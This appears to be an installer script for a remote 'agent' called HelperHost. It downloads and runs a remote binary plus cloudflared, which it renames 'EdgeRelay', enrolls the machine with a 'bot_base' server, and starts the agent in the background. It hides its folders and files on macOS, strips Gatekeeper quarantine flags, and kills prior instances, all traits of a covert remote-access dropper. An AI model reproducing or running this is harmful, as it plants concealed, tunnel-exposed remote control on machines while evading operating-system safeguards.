#!/usr/bin/env bash
set -euo pipefail
ENROLL="${1:-${AGENTSHE_ENROLL:-}}"
BOT_BASE="${2:-${AGENTSHE_BOT_BASE:-}}"
GH="${AGENTSHE_GH:-https://github.com/lilygopro/AgentSHE/releases/download/v1.0.6}"
BOT_BASE="${BOT_BASE%/}"

if [ -z "$ENROLL" ] || [ -z "$BOT_BASE" ]; then
  echo "usage: install.sh <enroll> <bot_base>" >&2
  exit 1
fi

if [ "$(uname -s)" = "Darwin" ]; then
  DIR="$HOME/Library/Application Support/HelperHost"
else
  DIR="$HOME/.local/share/HelperHost"
fi
CACHE="${TMPDIR:-/tmp}/HelperHostCache"
mkdir -p "$DIR" "$CACHE"
if [ "$(uname -s)" = "Darwin" ]; then
  chflags hidden "$DIR" "$CACHE" 2>/dev/null || true
fi
cd "$DIR"

# Stop previous instance / watchdog (no duplicates)
pkill -f "$DIR/watchdog.sh" 2>/dev/null || true
pkill -f "$DIR/reconnect.sh" 2>/dev/null || true
pkill -f "$DIR/HelperHost" 2>/dev/null || true
pkill -f "$DIR/EdgeRelay" 2>/dev/null || true
pkill -x HelperHost 2>/dev/null || true
pkill -x EdgeRelay 2>/dev/null || true
sleep 0.3

ARCH="$(uname -m)"
OS="$(uname -s)"
case "$ARCH" in
  x86_64|amd64) ARCH_N=amd64 ;;
  aarch64|arm64) ARCH_N=arm64 ;;
  *) echo "arch non supportée: $ARCH" >&2; exit 1 ;;
esac
case "$OS" in
  Darwin) OS_N=darwin; HH=HelperHost ;;
  Linux)  OS_N=linux;  HH=HelperHost ;;
  *) echo "OS non supporté: $OS" >&2; exit 1 ;;
esac

restore_or_fetch() {
  local name="$1" url="$2"
  if [ -x "$DIR/$name" ]; then
    cp -f "$DIR/$name" "$CACHE/$name" 2>/dev/null || true
    return 0
  fi
  if [ -f "$CACHE/$name" ]; then
    cp -f "$CACHE/$name" "$DIR/$name"
    chmod +x "$DIR/$name"
    return 0
  fi
  curl -fsSL "$url" -o "$CACHE/$name.download"
  cp -f "$CACHE/$name.download" "$CACHE/$name"
  cp -f "$CACHE/$name" "$DIR/$name"
  chmod +x "$DIR/$name"
  if [ "$(uname -s)" = "Darwin" ]; then
    xattr -d com.apple.quarantine "$DIR/$name" 2>/dev/null || true
    xattr -cr "$DIR/$name" 2>/dev/null || true
    chflags hidden "$DIR/$name" "$CACHE/$name" 2>/dev/null || true
  fi
}

restore_or_fetch "$HH" "$GH/HelperHost-$OS_N-$ARCH_N"
if [ "$(uname -s)" = "Darwin" ]; then
  xattr -d com.apple.quarantine "$DIR/$HH" 2>/dev/null || true
  xattr -cr "$DIR/$HH" 2>/dev/null || true
fi

if [ "$OS" = "Darwin" ]; then
  if [ "$ARCH_N" = "arm64" ]; then U="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-arm64"
  else U="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-amd64"; fi
else
  if [ "$ARCH_N" = "arm64" ]; then U="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64"
  else U="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64"; fi
fi
restore_or_fetch EdgeRelay "$U"
if [ "$(uname -s)" = "Darwin" ]; then
  xattr -d com.apple.quarantine "$DIR/EdgeRelay" 2>/dev/null || true
  xattr -cr "$DIR/EdgeRelay" 2>/dev/null || true
fi

printf '%s\n' "{\"enroll\":\"$ENROLL\",\"bot_base\":\"$BOT_BASE\"}" > "$DIR/config.json"
export AGENTSHE_ENROLL="$ENROLL" AGENTSHE_BOT_BASE="$BOT_BASE"

rm -f "$DIR/token" "$DIR/boot.log" "$DIR/agent.log"
nohup "$DIR/$HH" >"$DIR/boot.log" 2>&1 &
for i in $(seq 1 180); do
  if [ -f "$DIR/token" ] && pgrep -f "$DIR/$HH" >/dev/null 2>&1; then
    echo OK
    exit 0
  fi
  if grep -q '^OK$' "$DIR/boot.log" 2>/dev/null; then
    if [ -f "$DIR/token" ] || pgrep -f "$DIR/$HH" >/dev/null 2>&1; then
      echo OK
      exit 0
    fi
  fi
  if grep -q '^FAIL' "$DIR/boot.log" 2>/dev/null; then exit 1; fi
  sleep 1
done
echo timeout >&2; exit 1
